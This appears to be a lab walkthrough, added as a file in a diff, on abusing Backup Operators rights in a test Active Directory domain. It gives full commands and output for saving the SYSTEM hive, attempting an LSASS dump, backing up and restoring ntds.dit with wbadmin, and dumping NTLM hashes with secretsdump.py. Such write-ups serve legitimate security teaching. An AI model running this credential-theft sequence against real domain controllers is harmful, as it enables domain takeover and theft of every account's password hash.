@@ -1,0 +1,296 @@
+========================================================================================================================
+Abusing 'Backup Operators' privileges to become Domain Administrator
+========================================================================================================================
+
+=> Members of the group 'Backup Operators' are granted the ability to logon to, shut down, and perform backup/restore operations on Domain Controllers (assigned via the Default Domain Controllers Policy GPO).
+   This group cannot directly modify AD admin groups, though associated privileges provides a path for escalation to AD admin. 
+   Backup Operators have the ability to schedule tasks and are able to clear the event logs on Domain Controllers.
+
+=> There are many ways to take over a Domain and become Domain Admin whith an account member of the group 'Backup Operators'.
+   I will just demonstrate below 1 of the many ways to privesc to Domain Admin.
+
+=> Links: 
+https://adsecurity.org/?p=3700
+https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 
+
+
+========================================================================================================================
+Step 1. Log into the Domain Controller with an account member of the group 'Backup Operators'
+========================================================================================================================
+
+You can do a RDP connection to the Domain Controller or use PowerShell Remoting (Enter-PSSession ...).
+
+
+Windows PowerShell
+Copyright (C) 2013 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\ABIGAIL_ALSTON> net user ABIGAIL_ALSTON
+User name                    ABIGAIL_ALSTON
+Full Name                    ABIGAIL_ALSTON
+Comment                      Created with secframe.com/badblood.
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/14/2021 3:47:27 PM
+Password expires             12/26/2021 3:47:27 PM
+Password changeable          11/15/2021 3:47:27 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/14/2021 8:43:11 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Backup Operators
+Global Group memberships     *HA-mon-distlist *Domain Users
+The command completed successfully.
+
+PS C:\Users\ABIGAIL_ALSTON> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                   SID
+=========================== =============================================
+security-lab\abigail_alston S-1-5-21-3698357007-189532211-3203426890-1684
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                  Group used for deny only
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+SECURITY-LAB\TY-ari-admingroup             Group            S-1-5-21-3698357007-189532211-3203426890-5839 Mandatory group, Enabled by default, Enabled group
+SECURITY-LAB\HA-mon-distlist               Group            S-1-5-21-3698357007-189532211-3203426890-5865 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+---------------------
+---------------------
+Note: Using this account member of 'backup operators', I was able to remotely browse the C$ share of the Domain Controller but not to remotely create/execute/query
+      scheduled tasks which normally should have worked according to what I read.
+
+C:\Users\jeff>runas /netonly /noprofile /user:security-lab\ABIGAIL_ALSTON powershell
+Enter the password for security-lab\ABIGAIL_ALSTON:
+Attempting to start powershell as user "security-lab\ABIGAIL_ALSTON" ...
+
+PS C:\WINDOWS\system32> ls \\192.168.1.50\C$
+
+    Directory: \\192.168.1.50\C$
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/17/2020   5:43 PM                Microsoft
+d-----         8/22/2013   8:52 AM                PerfLogs
+d-r---         5/26/2020   6:51 PM                Program Files
+d-----         4/18/2020   3:38 PM                Program Files (x86)
+d-----         4/18/2020   3:45 PM                Shadow
+d-----        11/13/2021   4:38 PM                temp
+d-r---         4/18/2020   2:02 PM                Users
+d-----        11/13/2021   6:46 PM                Windows
+
+PS C:\WINDOWS\system32> schtasks /create /S temp-dc.security-test-lab.local /SC Weekly /TN "Testbackup" /TR "powershell.exe -c 'echo test > C:\temp\backup.txt'"
+ERROR: Access is denied.
+
+
+========================================================================================================================
+Step 2. Extract/Copy the registry hive 'SYSTEM' using the Windows command 'reg save'
+========================================================================================================================
+
+=> To be able to run 'reg save' you need to use an elevated command prompt. To open an elevated command prompt, click Start, right-click Command Prompt, and then click Run as administrator.
+   The command prompt won't be flagged with the name "Administrator" since we are not admin (but only 'Backup Operators') however it will be "elevated". 
+
+PS C:\temp\Tools> cd ..
+
+PS C:\temp> reg save HKLM\SYSTEM SYSTEM.hive
+The operation completed successfully.
+
+PS C:\temp>
+
+-----------------
+-----------------
+NOTE: As a member of the 'backup Operators' group we don't have enough privileges to do a memory dump of the LSASS process.
+
+PS C:\temp\Tools\Procdump> .\procdump64.exe -ma lsass.exe lsass.dmp -accepteula
+ProcDump v10.11 - Sysinternals process dump utility
+Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+Error opening lsass.exe (444):
+Access is denied. (0x00000005, 5)
+
+
+========================================================================================================================
+Step 3. Backup the NTDS.DIT file using the Windows command 'Wbadmin'
+========================================================================================================================
+
+Notes: 
+=> Wbadmin is an elevated command prompt that allows administrators or backup operators to backup and restores an operating system (OS), volume, files, folders, or applications
+=> To be able to run Wbadmin you need to use an elevated command prompt. To open an elevated command prompt, click Start, right-click Command Prompt, and then click Run as administrator.
+   The command prompt won't be flagged with the name "Administrator" since we are not admin (but only 'Backup Operators') however it will be "elevated". 
+
+
+--------------------------------------------------------------------------
+Step 3.1. Backup the NTDS.dit file
+--------------------------------------------------------------------------
+
+PS C:\Windows\system32> wbadmin start backup -quiet -backuptarget:\\temp-dc\c$\temp\backup -include:c:\Windows\ntds
+
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright 2013 Microsoft Corporation. All rights reserved.
+
+Note: The backed up data cannot be securely protected at this destination.
+Backups stored on a remote shared folder might be accessible by other people on the network. You should only save your backups to a location
+where you trust the other users who have access to the location or on a network that has additional security precautions in place.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\temp-dc\c$\temp\backup.
+The backup operation to \\temp-dc\c$\temp\backup is starting.
+Creating a shadow copy of the volumes specified for backup...
+Please wait while files to backup for volume (C:) are identified.
+This might take several minutes.
+Creating a backup of volume (C:), copied (100%).
+Summary of the backup operation:
+------------------
+
+The backup operation successfully completed.
+The backup of volume (C:) completed successfully.
+Log of files successfully backed up:
+C:\Windows\Logs\WindowsServerBackup\Backup-14-11-2021_21-20-48.log
+
+
+--------------------------------------------------------------------------
+Step 3.2. List the backup files
+--------------------------------------------------------------------------
+S C:\Windows\system32> wbadmin get versions
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright 2013 Microsoft Corporation. All rights reserved.
+
+Backup time: 11/14/2021 10:20 PM
+Backup location: Network Share labeled \\temp-dc\c$\temp\backup
+Version identifier: 11/14/2021-21:20
+Can recover: Volume(s), File(s)
+
+
+--------------------------------------------------------------------------
+Step 3.3. Restore the backuped NTDS.DIT file and collect it.
+--------------------------------------------------------------------------
+
+PS C:\Windows\system32> wbadmin start recovery -quiet -version:11/14/2021-21:20 -itemtype:file -items:c:\Windows\ntds\ntds.dit -recoverytarget:c:\temp\backup -notrestoreacl
+
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright 2013 Microsoft Corporation. All rights reserved.
+
+Retrieving volume information...
+You have chosen to recover the file(s) c:\Windows\ntds\ntds.dit from the
+backup created on 11/14/2021 10:20 PM to c:\temp\backup.
+Preparing to recover files...
+
+Successfully recovered c:\Windows\ntds\ntds.dit to c:\temp\backup\.
+The recovery operation completed.
+Summary of the recovery operation:
+--------------------
+
+Recovery of c:\Windows\ntds\ntds.dit to c:\temp\backup\ successfully completed.
+Total bytes recovered: 60.01 MB
+Total files recovered: 1
+Total files failed: 0
+
+Log of files successfully recovered:
+C:\Windows\Logs\WindowsServerBackup\FileRestore-14-11-2021_21-24-41.log
+
+PS C:\Windows\system32>
+
+PS C:\temp\backup> ls
+
+    Directory: C:\temp\backup
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        11/14/2021  10:20 PM            WindowsImageBackup
+-a---        11/14/2021  10:20 PM   62930944 ntds.dit
+
+PS C:\temp\backup>
+
+PS C:\temp\backup> ls "C:\temp\backup\WindowsImageBackup\TEMP-DC\Backup 2021-11-14 212048"
+
+    Directory: C:\temp\backup\WindowsImageBackup\TEMP-DC\Backup 2021-11-14 212048
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---        11/14/2021  10:20 PM  171966464 43f4e5b7-6e31-11e8-80b1-806e6f6e6963.vhdx
+-a---        11/14/2021  10:20 PM        776 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_AdditionalFilesc3b9f3c7-5e52-4d5e-8b2                                             0-19adc95a34c7.xml
+-a---        11/14/2021  10:20 PM       5534 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Components.xml
+-a---        11/14/2021  10:20 PM       7670 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_RegistryExcludes.xml
+-a---        11/14/2021  10:20 PM       3138 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writer0bada1de-01a9-4625-8278-69e735f                                             39dd2.xml
+-a---        11/14/2021  10:20 PM       2310 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writer2707761b-2324-473d-88eb-eb007a3                                             59533.xml
+-a---        11/14/2021  10:20 PM       3102 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writer4dc3bdd4-ab48-4d07-adb0-3bee292                                             6fd7f.xml
+-a---        11/14/2021  10:20 PM       1488 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writer542da469-d3e1-473c-9f4f-7847f01                                             fc64f.xml
+-a---        11/14/2021  10:20 PM       1628 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writer75dfb225-e2e4-4d39-9ac9-ffaff65                                            ddf06.xml
+-a---        11/14/2021  10:20 PM       1484 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writera6ad56c2-b509-4e6c-bb19-49d8f43                                             532f0.xml
+-a---        11/14/2021  10:20 PM       3828 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writerafbab4a2-367d-4d15-a586-71dbb18                                             f8485.xml
+-a---        11/14/2021  10:20 PM       1850 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writerb2014c9e-8711-4c5c-a5a9-3cf3844                                             84757.xml
+-a---        11/14/2021  10:20 PM       3986 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writerbe000cbe-11fe-4426-9c58-531aa63                                            55fc4.xml
+-a---        11/14/2021  10:20 PM       1746 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writerd61d61c8-d73a-4eee-8cdd-f6f9786                                          b7124.xml
+-a---        11/14/2021  10:20 PM    3975900 b7bc1b5f-25a3-48d3-bd67-e810bb183b42_Writere8132975-6f93-4464-a53e-1050253                                            ae220.xml
+-a---        11/14/2021  10:20 PM        784 BackupSpecs.xml
+
+PS C:\temp\backup>
+
+
+========================================================================================================================
+Step 4. Extract the password hashes from the NTDS.DIT file using the SYSTEM registry hive and Secretsdump.py (Impacket) 
+        => Game over !!
+========================================================================================================================
+
+(kali@kali)-[/usr/share/doc/python3-impacket/examples]$ python3 secretsdump.py -ntds ntds.dit -system SYSTEM.hive LOCAL
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x941140bd825386b732031d5c5b01ae8a
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: b175740e0908fe396a15b0dc5631e72a
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a558c1aa1212fb2dd<SNIP>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0<SNIP>
+backup:1008:aad3b435b51404eeaad3b435b51404ee:1d6fcbd306077d663e23775e<SNIP>
+TEMP-DC$:1009:aad3b435b51404eeaad3b435b51404ee:cf8e5ee10c7615bc73f4b2<SNIP>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:208ae4a2c5aa7b40d04734994<SNIP>
+Security-Test-Lab.Local\EDUARDO_MAXWELL:1112:aad3b435b51404eeaad3b435<SNIP>
+Security-Test-Lab.Local\INES_TILLMAN:1113:aad3b435b51404eeaad3b435b51<SNIP>
+Security-Test-Lab.Local\BRIDGET_BALLARD:1114:aad3b435b51404eeaad3b435<SNIP>
+Security-Test-Lab.Local\RHONDA_EATON:1115:aad3b435b51404eeaad3b435b51<SNIP>
+<SNIP>
+
